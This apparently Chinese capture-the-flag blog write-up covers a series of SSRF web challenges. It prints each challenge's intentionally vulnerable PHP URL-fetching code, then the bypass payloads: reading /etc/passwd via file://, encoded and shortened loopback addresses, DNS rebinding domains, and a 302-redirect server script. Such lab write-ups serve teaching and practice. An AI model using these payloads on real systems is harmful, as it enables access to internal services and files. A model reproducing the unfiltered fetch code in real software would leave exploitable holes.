+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-comment">//初始化一个cURL会话</span><br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-comment">//设定返回信息中包含响应信息头</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-comment">//启用时会将头文件的信息作为数据流输出。 </span><br><span class="hljs-comment">//参数为1表示输出信息头,为0表示不输出</span><br> <br><span class="hljs-comment">//设定curl_exec()函数将响应结果返回，而不是直接输出</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-comment">//参数为1表示$result,为0表示echo $result</span><br> <br><span class="hljs-comment">//执行一个cURL会话</span><br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-comment">//关闭一个curl会话</span><br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-comment">//输出返回信息  如果CURLOPT_RETURNTRANSFER参数为fasle可省略</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>分析源码发现没有过滤，直接使用file协议读取本地文件。</p>
+<p>尝试post传入url，并使用file协议作为参数，file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd 有返回值。 然后猜测flag在当前目录，而当前目录一般都是&#x2F;var&#x2F;www&#x2F;html </p>
+<p>payload：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">post：<br>url=http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/flag.php<br>url=localhost/flag.php<br>url=file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>flag.php	<span class="hljs-regexp">//</span>需要查看源码<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-352（过滤localhost和127-0-0绕过）"><a href="#web-352（过滤localhost和127-0-0绕过）" class="headerlink" title="web-352（过滤localhost和127.0.0绕过）"></a>web-352（过滤localhost和127.0.0绕过）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;			<span class="hljs-comment">//过滤掉了localhost和127.0.0</span><br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> hacker<br></code></pre></td></tr></table></figure>
+
+<p>发现过滤了localhost和127.0.0</p>
+<p>可以使用很多方法绕过</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">url</span>=http://<span class="hljs-number">0</span>x7F.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>/flag.php   <span class="hljs-number">16</span>进制<br><span class="hljs-attribute">url</span>=http://<span class="hljs-number">0177</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>/flag.php    <span class="hljs-number">8</span>进制<br><span class="hljs-attribute">url</span>=http://<span class="hljs-number">0.0.0.0</span>/flag.php<br><span class="hljs-attribute">url</span>=http://<span class="hljs-number">0</span>/flag.php		在Linux中<span class="hljs-number">0</span>表示自身的地址<br><span class="hljs-attribute">url</span>=http://<span class="hljs-number">127.127.127.127</span>/flag.php<br><span class="hljs-attribute">url</span>=http://<span class="hljs-number">7</span>f000001.c0a80001.rbndr.us/flag.php	DNS重绑定<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-353（过滤127-0-01和localhost绕过）"><a href="#web-353（过滤127-0-01和localhost绕过）" class="headerlink" title="web-353（过滤127.0.01和localhost绕过）"></a>web-353（过滤127.0.01和localhost绕过）</h2><p>先看看题目</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/localhost|127\.0\.|\。/i&#x27;</span>, <span class="hljs-variable">$url</span>))&#123;<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> hacker<br></code></pre></td></tr></table></figure>
+
+<p>过滤更加严格，但可以使用进制变换，和上一题类似</p>
+<figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs qml">十六进制<br><span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//0x7F.0.0.1/flag.php</span><br><br>八进制<br><span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//0177.0.0.1/flag.php</span><br><br><span class="hljs-number">10</span> 进制整数格式<br><span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//2130706433/flag.php</span><br><br><span class="hljs-number">16</span> 进制整数格式，还是上面那个网站转换记得前缀<span class="hljs-number">0</span>x<br><span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//0x7F000001/flag.php</span><br><br><span class="hljs-comment">// 缺省零</span><br><span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//127.1/flag.php		</span><br>用CIDR绕过localhost<br><span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//127.127.127.127/flag.php</span><br><span class="hljs-comment">//在Linux中0表示自身的地址，所以可以绕过，在windows中解析成 0.0.0.0所以在windows中不行</span><br><span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//0/flag.php			</span><br><span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//0.0.0.0/flag.php</span><br><br><span class="hljs-comment">//使用sudo.cc代替127.0.0.1/localhost </span><br><span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//sudo.cc/flag.php		</span><br><br><span class="hljs-comment">// 127.0.0.1 ~ 127.255.255.254 都表示 localhost</span><br><span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//127.255.255.254/flag.php</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-354（过滤了0和1、localhost、DNS重绑定、302跳转）"><a href="#web-354（过滤了0和1、localhost、DNS重绑定、302跳转）" class="headerlink" title="web-354（过滤了0和1、localhost、DNS重绑定、302跳转）"></a>web-354（过滤了0和1、localhost、DNS重绑定、302跳转）</h2><p>先看题目</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/localhost|1|0|。/i&#x27;</span>, <span class="hljs-variable">$url</span>))&#123;<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> hacker<br></code></pre></td></tr></table></figure>
+
+<p>这一题多过滤了1和0</p>
+<p>DNS重绑定绕过</p>
+<p>payload</p>
+<figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs qml">使用解析到<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>的<span class="hljs-built_in">url</span>绕过<br><span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//safe.taobao.com/flag.php</span><br><br>A记录sudo.cc指向IP地址<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>。<br><span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//sudo.cc/flag.php </span><br></code></pre></td></tr></table></figure>
+
+<p>或者使用302跳转绕过。</p>
+<p>我们需要有一台有公网IP的服务器，然后进行域名解析的WEB服务，然后构建302重定向代码，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">具体步骤<br>在有公网的服务器linux系统下<br><span class="hljs-comment">#index.php</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:http://127.0.0.1/flag.php&#x27;</span>);<br><br>开启web服务<br>php -S <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">7777</span><br><br><br>ssrf服务器访问<br>http:<span class="hljs-comment">//公网ip:7777/index.php</span><br><br>成功执行<span class="hljs-number">302</span>重定向<br></code></pre></td></tr></table></figure>
+
+<p>有点无语，我的公网IP刚好带个0，所以不行，除非买个域名</p>
+<hr>
+<h2 id="web-355（host限制小于等于5省略绕过）"><a href="#web-355（host限制小于等于5省略绕过）" class="headerlink" title="web-355（host限制小于等于5省略绕过）"></a>web-355（host限制小于等于5省略绕过）</h2><p>先看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-variable">$host</span>=<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br><span class="hljs-keyword">if</span>((<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$host</span>)&lt;=<span class="hljs-number">5</span>))&#123;		<span class="hljs-comment">//限制了host长度必须小于等于5</span><br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> hacker<br></code></pre></td></tr></table></figure>
+
+<p>看了一下，发现限制了host小于等于5，使用127.1省略绕过</p>
+<p>payload：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">url</span>=http://<span class="hljs-number">127.1</span>/flag.php<br><span class="hljs-attr">url</span>=http://<span class="hljs-number">0</span>/flag.php<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-356（host长度限制小于等于3）"><a href="#web-356（host长度限制小于等于3）" class="headerlink" title="web-356（host长度限制小于等于3）"></a>web-356（host长度限制小于等于3）</h2><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-variable">$host</span>=<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br><span class="hljs-keyword">if</span>((<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$host</span>)&lt;=<span class="hljs-number">3</span>))&#123;<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> hacker<br></code></pre></td></tr></table></figure>
+
+<p>这题限制了host长度小于等于3</p>
+<p><strong>0在 linux 系统中会解析成127.0.0.1在windows中解析成0.0.0.0</strong></p>
+<p>payload：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">url</span>=http://<span class="hljs-number">0.0</span>/flag.php<br><span class="hljs-attr">url</span>=http://<span class="hljs-number">0</span>/flag.php<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-357（DNS重绑定、302跳转绕过）"><a href="#web-357（DNS重绑定、302跳转绕过）" class="headerlink" title="web-357（DNS重绑定、302跳转绕过）"></a>web-357（DNS重绑定、302跳转绕过）</h2><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">gethostbyname</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;host&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="hljs-variable">$ip</span>.<span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">filter_var</span>(<span class="hljs-variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;ip!&#x27;</span>);<br>&#125;<br><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;scheme&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> scheme<br></code></pre></td></tr></table></figure>
+
+<p>&#x2F; gethostbyname — 返回主机名对应的IPv4地址</p>
+<p>&#x2F;&#x2F; filter_var — 使用特定的过滤器过滤一个变量</p>
+<p>&#x2F;&#x2F; FILTER_VALIDATE_IP - 验证是否为有效的IP地址</p>
+<p>&#x2F;&#x2F; FILTER_FLAG_NO_PRIV_RANGE - 排除私有IP地址</p>
+<p>&#x2F;&#x2F; FILTER_FLAG_NO_RES_RANGE 排除保留IP地址 如回环地址127.0.0.1</p>
+<p><strong>这题可以使用302跳转绕过。</strong></p>
+<p>我们需要有一台有公网IP的服务器，然后进行域名解析的WEB服务，然后构建302重定向代码，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">具体步骤<br>在有公网的服务器linux系统下<br><span class="hljs-comment">#index.php</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:http://127.0.0.1/flag.php&#x27;</span>);<br><br>开启web服务<br>php -S <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">7777</span><br><br><br>ssrf服务器访问<br>http:<span class="hljs-comment">//公网ip:7777/index.php</span><br><br>成功执行<span class="hljs-number">302</span>重定向<br></code></pre></td></tr></table></figure>
+
+<hr>
+<p>也可以使用DNS重绑定绕过</p>
+<p><a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg">dns重绑定</a></p>
